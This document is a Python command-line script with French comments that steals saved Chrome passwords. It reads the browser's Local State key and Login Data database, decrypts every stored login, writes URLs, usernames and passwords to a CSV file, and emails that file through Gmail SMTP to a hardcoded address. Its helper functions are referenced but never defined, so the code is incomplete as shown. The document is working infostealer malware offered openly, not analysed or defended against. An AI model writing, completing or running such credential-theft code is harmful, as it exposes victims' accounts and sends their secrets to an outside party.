python -c "
import os, re, sys, json, base64, sqlite3, win32crypt, Cryptodome.Cipher.AES as AES, shutil, csv, smtplib, ssl

CHROME_PATH_LOCAL_STATE = os.path.normpath(r'%s\AppData\Local\Google\Chrome\User Data\Local State'%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r'%s\AppData\Local\Google\Chrome\User Data'%(os.environ['USERPROFILE']))

# Définir les fonctions ici

try:
    # Créer un fichier CSV pour stocker les mots de passe
    with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
        csv_writer = csv.writer(decrypt_password_file, delimiter=',')
        csv_writer.writerow(['index','url','username','password'])
        # Obtenir la clé secrète
        secret_key = get_secret_key()
        # Rechercher le dossier utilisateur ou le dossier par défaut
        folders = [element for element in os.listdir(CHROME_PATH) if re.search('^Profile*|^Default$',element)!=None]
        for folder in folders:
            # Obtenir le texte chiffré à partir de la base de données SQLite
            chrome_path_login_db = os.path.normpath(r'%s\%s\Login Data'%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute('SELECT action_url, username_value, password_value FROM logins')
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!='' and username!='' and ciphertext!=''):
                        # Filtrer le vecteur d'initialisation et le mot de passe chiffré à partir du texte chiffré
                        # Utiliser l'algorithme AES pour déchiffrer le mot de passe
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        print('Sequence: %d'%(index))
                        print('URL: %s\nUser Name: %s\nPassword: %s\n'%(url,username,decrypted_password))
                        print('*'*50)
                        # Sauvegarder dans le CSV
                        csv_writer.writerow([index,url,username,decrypted_password])
                # Fermer la connexion à la base de données
                cursor.close()
                conn.close()
                # Supprimer la base de données temporaire
                os.remove('Loginvault.db')
    # Envoyer le fichier CSV par e-mail
    sender_email = "breen.important@gmail.com"
    receiver_email = "breen.important@gmail.com"
    password = "votre_mot_de_passe_ici"
    message = """Subject: Mots de passe Chrome déchiffrés
    Voici les mots de passe Chrome déchiffrés.
    """
    context = ssl.create_default_context()
    with open("decrypted_password.csv", "r") as file:
        message += file.read()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
except Exception as e:
    print('[ERR] %s'%str(e))
"
